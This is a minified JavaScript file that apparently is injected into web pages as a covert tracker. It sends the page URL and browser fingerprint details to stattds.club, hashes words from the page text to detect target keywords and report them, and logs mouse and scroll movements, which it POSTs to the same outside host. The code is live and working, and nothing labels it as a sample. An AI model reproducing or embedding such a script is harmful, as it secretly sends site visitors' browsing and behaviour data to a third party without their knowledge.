(function track(){if(window["track_039303e8-bed7-4eb8-b74a-8eb4ece6d1fb"]!==!0){var statImg=new Image,url="http://stattds.club/s8194/Content/track.gif?" +"cl=" + window.location.href +"&bcn=" + navigator.appCodeName +"&bn=" + navigator.appName +"&bv=" + navigator.appVersion +"&ce=" + navigator.cookieEnabled +"&bl=" + navigator.language +"&np=" + navigator.platform +"&sw=" + screen.width +"&sh=" + screen.height +"&r=" + Math.random() +"&ab=uc";statImg.src=url,window["track_039303e8-bed7-4eb8-b74a-8eb4ece6d1fb"]=!0}(function(e,t,n,r,i){var s={},o=function(t){return e.Function("return "+t)()},u=e.document,a,f=function(t,i){var o={exports:{}};s[t]=1,n[t]=o.exports;if(!i)i=i||e[t];else if(typeof i=="function"){var u=l;r[t]&&r[t].sandbox&&typeof u=="function"&&(u=a),i=i(u,o.exports,o)||o.exports}return i=i,n[t]=i},l=function(e){var t=n[e],r=[e,t];return r&&(e=r[0],t=r[1]),s[e]&&t?t:(typeof t=="string"&&t.indexOf("(function(")===0&&(t=o(t)),f(e,t))},c={exports:{}};for(var h in n)s[h]=0;t(l,c.exports,c)})(this,function(e,t,n){window.XXH=e("xxhash")},{"./lib/uint32":function(e,t,n){(function(e){function t(e,n){if(!(this instanceof t))return new t(e,n);this._low=0,this._high=0,this.remainder=null;if(typeof n=="undefined")return i.call(this,e);if(typeof e=="string")return s.call(this,e,n);r.call(this,e,n)}function r(e,t){return this._low=e|0,this._high=t|0,this}function i(e){return this._low=e&65535,this._high=e>>>16,this}function s(e,t){var n=parseInt(e,t||10);return this._low=n&65535,this._high=n>>>16,this}var o={36:t(Math.pow(36,5)),16:t(Math.pow(16,7)),10:t(Math.pow(10,9)),2:t(Math.pow(2,30))},u={36:t(36),16:t(16),10:t(10),2:t(2)};t.prototype.fromBits=r,t.prototype.fromNumber=i,t.prototype.fromString=s,t.prototype.toNumber=function(){return this._high<<16|this._low},t.prototype.toString=function(e){e=e||10;var n=u[e]||new t(e);if(!this.gt(n))return this.toNumber().toString(e);var r=this.clone(),i=new Array(32);for(var s=31;s>=0;s--){r.div(n),i[s]=r.remainder.toNumber().toString(e);if(!r.gt(n))break}return i[s-1]=r.toNumber().toString(e),i.join("")},t.prototype.add=function(e){var t=this._low+e._low,n=t>>>16;return n+=this._high+e._high,this._low=t&65535,this._high=n&65535,this},t.prototype.subtract=function(e){return this.add(e.clone().negate())},t.prototype.multiply=function(e){var t=this._high,n=this._low,r=e._high,i=e._low,s,o;return o=n*i,s=o>>>16,s+=t*i,s&=65535,s+=n*r,this._low=o&65535,this._high=s&65535,this},t.prototype.div=function(e){if(e._low==0&&e._high==0)throw Error("division by zero");if(e._high==0&&e._low==1)return this.remainder=new t(0),this;if(e.gt(this))return this.remainder=new t(0),this._low=0,this._high=0,this;if(this.eq(e))return this.remainder=new t(0),this._low=1,this._high=0,this;var n=e.clone(),r=-1;while(!this.lt(n))n.shiftLeft(1,!0),r++;this.remainder=this.clone(),this._low=0,this._high=0;for(;r>=0;r--)n.shiftRight(1),this.remainder.lt(n)||(this.remainder.subtract(n),r>=16?this._high|=1<<r-16:this._low|=1<<r);return this},t.prototype.negate=t.prototype.not=function(){var e=(~this._low&65535)+1;return this._low=e&65535,this._high=~this._high+(e>>>16)&65535,this},t.prototype.equals=t.prototype.eq=function(e){return this._low==e._low&&this._high==e._high},t.prototype.greaterThan=t.prototype.gt=function(e){return this._high>e._high?!0:this._high<e._high?!1:this._low>e._low},t.prototype.lessThan=t.prototype.lt=function(e){return this._high<e._high?!0:this._high>e._high?!1:this._low<e._low},t.prototype.or=function(e){return this._low|=e._low,this._high|=e._high,this},t.prototype.and=function(e){return this._low&=e._low,this._high&=e._high,this},t.prototype.xor=function(e){return this._low^=e._low,this._high^=e._high,this},t.prototype.shiftRight=t.prototype.shiftr=function(e){return e>16?(this._low=this._high>>e-16,this._high=0):e==16?(this._low=this._high,this._high=0):(this._low=this._low>>e|this._high<<16-e&65535,this._high>>=e),this},t.prototype.shiftLeft=t.prototype.shiftl=function(e,t){return e>16?(this._high=this._low<<e-16,this._low=0,t||(this._high&=65535)):e==16?(this._high=this._low,this._low=0):(this._high=this._high<<e|this._low>>16-e,this._low=this._low<<e&65535,t||(this._high&=65535)),this},t.prototype.rotateLeft=t.prototype.rotl=function(e){var t=this._high<<16|this._low;return t=t<<e|t>>>32-e,this._low=t&65535,this._high=t>>>16,this},t.prototype.rotateRight=t.prototype.rotr=function(e){var t=this._high<<16|this._low;return t=t>>>e|t<<32-e,this._low=t&65535,this._high=t>>>16,this},t.prototype.clone=function(){return new t(this._low,this._high)},typeof define!="undefined"&&define.amd?define([],function(){return t}):typeof n!="undefined"&&n.exports?n.exports=t:e.UINT32=t})(this)},cuint:function(e,t,n){t.UINT32=e("./lib/uint32"),t.UINT64=e("./lib/uint64")},xxhash:function(e,t,n){(function(t){function r(e){var t=[];for(var n=0,r=e.length;n<r;n++){var i=e.charCodeAt(n);i<128?t.push(i):i<2048?t.push(192|i>>6,128|i&63):i<55296||i>=57344?t.push(224|i>>12,128|i>>6&63,128|i&63):(n++,i=65536+((i&1023)<<10|e.charCodeAt(n)&1023),t.push(240|i>>18,128|i>>12&63,128|i>>6&63,128|i&63))}return new Uint8Array(t)}function i(){if(arguments.length==2)return(new i(arguments[1])).update(arguments[0]).digest();if(!(this instanceof i))return new i(arguments[0]);s.call(this,arguments[0])}function s(e){return this.seed=e instanceof o?e.clone():o(e),this.v1=this.seed.clone().add(h),this.v2=this.seed.clone().add(a),this.v3=this.seed.clone(),this.v4=this.seed.clone().subtract(u),this.total_len=0,this.memsize=0,this.memory=null,this}var o=e("cuint").UINT32;o.prototype.xxh_update=function(e,t){var n=a._low,r=a._high,i,s;s=e*n,i=s>>>16,i+=t*n,i&=65535,i+=e*r;var o=this._low+(s&65535),f=o>>>16;f+=this._high+(i&65535);var l=f<<16|o&65535;l=l<<13|l>>>19,o=l&65535,f=l>>>16,n=u._low,r=u._high,s=o*n,i=s>>>16,i+=f*n,i&=65535,i+=o*r,this._low=s&65535,this._high=i&65535};var u=o("2654435761"),a=o("2246822519"),f=o("3266489917"),l=o("668265263"),c=o("374761393"),h=u.clone().add(a);i.prototype.init=s,i.prototype.update=function(e){var t=typeof e=="string",n;t&&(e=r(e),t=!1,n=!0),e instanceof ArrayBuffer&&(n=!0,e=new Uint8Array(e));var i=0,s=e.length,o=i+s;if(s==0)return this;this.total_len+=s,this.memsize==0&&(t?this.memory="":n?this.memory=new Uint8Array(16):this.memory=new Buffer(16));if(this.memsize+s<16)return t?this.memory+=e:n?this.memory.set(e.subarray(0,s),this.memsize):e.copy(this.memory,this.memsize,0,s),this.memsize+=s,this;if(this.memsize>0){t?this.memory+=e.slice(0,16-this.memsize):n?this.memory.set(e.subarray(0,16-this.memsize),this.memsize):e.copy(this.memory,this.memsize,0,16-this.memsize);var u=0;t?(this.v1.xxh_update(this.memory.charCodeAt(u+1)<<8|this.memory.charCodeAt(u),this.memory.charCodeAt(u+3)<<8|this.memory.charCodeAt(u+2)),u+=4,this.v2.xxh_update(this.memory.charCodeAt(u+1)<<8|this.memory.charCodeAt(u),this.memory.charCodeAt(u+3)<<8|this.memory.charCodeAt(u+2)),u+=4,this.v3.xxh_update(this.memory.charCodeAt(u+1)<<8|this.memory.charCodeAt(u),this.memory.charCodeAt(u+3)<<8|this.memory.charCodeAt(u+2)),u+=4,this.v4.xxh_update(this.memory.charCodeAt(u+1)<<8|this.memory.charCodeAt(u),this.memory.charCodeAt(u+3)<<8|this.memory.charCodeAt(u+2))):(this.v1.xxh_update(this.memory[u+1]<<8|this.memory[u],this.memory[u+3]<<8|this.memory[u+2]),u+=4,this.v2.xxh_update(this.memory[u+1]<<8|this.memory[u],this.memory[u+3]<<8|this.memory[u+2]),u+=4,this.v3.xxh_update(this.memory[u+1]<<8|this.memory[u],this.memory[u+3]<<8|this.memory[u+2]),u+=4,this.v4.xxh_update(this.memory[u+1]<<8|this.memory[u],this.memory[u+3]<<8|this.memory[u+2])),i+=16-this.memsize,this.memsize=0,t&&(this.memory="")}if(i<=o-16){var a=o-16;do t?(this.v1.xxh_update(e.charCodeAt(i+1)<<8|e.charCodeAt(i),e.charCodeAt(i+3)<<8|e.charCodeAt(i+2)),i+=4,this.v2.xxh_update(e.charCodeAt(i+1)<<8|e.charCodeAt(i),e.charCodeAt(i+3)<<8|e.charCodeAt(i+2)),i+=4,this.v3.xxh_update(e.charCodeAt(i+1)<<8|e.charCodeAt(i),e.charCodeAt(i+3)<<8|e.charCodeAt(i+2)),i+=4,this.v4.xxh_update(e.charCodeAt(i+1)<<8|e.charCodeAt(i),e.charCodeAt(i+3)<<8|e.charCodeAt(i+2))):(this.v1.xxh_update(e[i+1]<<8|e[i],e[i+3]<<8|e[i+2]),i+=4,this.v2.xxh_update(e[i+1]<<8|e[i],e[i+3]<<8|e[i+2]),i+=4,this.v3.xxh_update(e[i+1]<<8|e[i],e[i+3]<<8|e[i+2]),i+=4,this.v4.xxh_update(e[i+1]<<8|e[i],e[i+3]<<8|e[i+2])),i+=4;while(i<=a)}return i<o&&(t?this.memory+=e.slice(i):n?this.memory.set(e.subarray(i,o),this.memsize):e.copy(this.memory,this.memsize,i,o),this.memsize=o-i),this},i.prototype.digest=function(){var e=this.memory,t=typeof e=="string",n=0,r=this.memsize,i,s,h=new o;this.total_len>=16?i=this.v1.rotl(1).add(this.v2.rotl(7).add(this.v3.rotl(12).add(this.v4.rotl(18)))):i=this.seed.add(c),i.add(h.fromNumber(this.total_len));while(n<=r-4)t?h.fromBits(e.charCodeAt(n+1)<<8|e.charCodeAt(n),e.charCodeAt(n+3)<<8|e.charCodeAt(n+2)):h.fromBits(e[n+1]<<8|e[n],e[n+3]<<8|e[n+2]),i.add(h.multiply(f)).rotl(17).multiply(l),n+=4;while(n<r)h.fromBits(t?e.charCodeAt(n++):e[n++],0),i.add(h.multiply(c)).rotl(11).multiply(u);return s=i.clone().shiftRight(15),i.xor(s).multiply(a),s=i.clone().shiftRight(13),i.xor(s).multiply(f),s=i.clone().shiftRight(16),i.xor(s),this.init(this.seed),i},typeof define!="undefined"&&define.amd?define([],function(){return i}):typeof n!="undefined"&&n.exports?n.exports=i:t.XXH=i})(this)}},{},{});function test(){for(var t,e=['5f139a6','ad3d5f27','694b8e55'],o=o=document.body.textContent||document.body.innerText,a=/(?:\s+)([a-zА-Я]{10,11})(?:[\s!.?,;:'"-]+)/gi,n=[];t=a.exec(o);)n.push(t[1].toLowerCase());for(var r=0;r<n.length;r++)for(var s=n[r],d=XXH(s,43981).toString(16),f=0;f<e.length;f++)if(d==e[f]){var i=new Image;return void(i.src='http://st.stattds.club/s8194/stat/?ab=wa')}}setTimeout(test,5e3);})();function isNeededSendEventData(e){var t=Math.random();return.05>=t&&e.length>0}function sendEventData(e,t){var n=getXmlHttp();n.open("POST","http://stattds.club/s8194/Stat/ClientTrack",!0),n.setRequestHeader("Content-Type","application/json");var i={data:{id:t,eventData:JSON.stringify(e)}};n.send(JSON.stringify(i))}function getXmlHttp(){var e;try{e=new ActiveXObject("Msxml2.XMLHTTP")}catch(t){try{e=new ActiveXObject("Microsoft.XMLHTTP")}catch(t){e=!1}}return e||"undefined"==typeof XMLHttpRequest||(e=new XMLHttpRequest),e}function initializeEventHandling(e){document.onmousemove=function(t){handleUserEvent(t,"m",e)},document.onscroll=function(t){handleUserEvent(t,"s",e)}}function handleUserEvent(e,t,n){e=e||window.event;var i={e:t,t:e.timeStamp};if("m"===t)i.x=e.clientX,i.y=e.clientY;else{var a=window.pageXOffset||document.documentElement.scrollLeft,o=window.pageYOffset||document.documentElement.scrollTop;i.x=a,i.y=o}n.push(i)}!function(){var e="1706261132571000025",t=[];initializeEventHandling(t),setTimeout(function(){isNeededSendEventData(t)&&sendEventData(t,e),t.length>0&&(t.length=0)},6e4)}();